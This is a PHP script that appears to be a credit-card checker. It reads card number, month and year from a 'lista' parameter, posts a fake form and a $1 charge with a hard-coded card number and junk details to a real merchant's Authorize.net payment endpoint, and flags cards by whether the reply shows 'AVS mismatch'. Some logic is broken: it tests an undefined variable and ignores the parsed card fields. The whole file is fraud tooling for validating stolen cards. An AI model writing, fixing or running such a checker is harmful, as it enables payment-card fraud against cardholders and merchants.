<?php

include('functions/curl.php');
include('functions/getstr.php');
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $cc = trim(explode("|", $_GET['lista'])[0]);
    $mes = trim(explode("|", $_GET['lista'])[1]);
	$ano = trim(explode("|", $_GET['lista'])[2]);
	
	$a=array("hotmail","gmail","outlook");
    $randmail=array_rand($a, 2);
	


//PRECISA CONVERTER O MES PRA NUMERO

	
    $response = curl('https://www.emailmeform.com/builder/form/ePr3AmvX9cufs5c9Zb', 'element_2=asdc&element_3=asdcasd&element_7=asdcasd3443%40hjbdc.com&element_8%5B%5D=333&element_8%5B%5D=333&element_8%5B%5D=3333&element_10=ascdasdc4334&element_11=aCXSADC4334&element_12=NewYork&element_13=NY&element_14=10001&element_15=United+States&element_17=Kristina+Murphy&element_18=1&element_20%5B%5D=1&element_20%5B%5D=0&x=56&y=24&element_counts=21&embed=embed&http_referer=&emf_cart=%5B%5B%7B%22label%22%3A%22Payment+Amount%22%2C%22price%22%3A1%7D%5D%5D', array('Host: www.emailmeform.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded','Referer: https://www.emailmeform.com/builder/embed/ePr3AmvX9cufs5c9Zb', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'));
    $response = curl('https://www.emailmeform.com/builder/merchant/payment/authnet', 'act=save&invoice_id=1086382&chargify_product_id=&first_name=asdcasdc&last_name=asdcasdc&cc=4126549002528153&exp_month=02&exp_year=2020&code=+++&street=asdcasd3434&city=NewYork&state=NY&zip=10001&country=United+States&receipt_email=asc4334%40djhbc.com', array('Host: www.emailmeform.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded','Referer: https://www.emailmeform.com/builder/merchant/payment/authnet/3876271/125709737', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'));
        

	echo $response;
    if (!strpos($step1, 'AVS mismatch') !== false ) {
        echo json_encode(array("status" => 0, "msg" => "$cc $mes $ano"));
    } else {
        echo json_encode(array("status" => 1, "msg" => "$cc $mes $ano"));
    }
} else {
    echo "Error";
}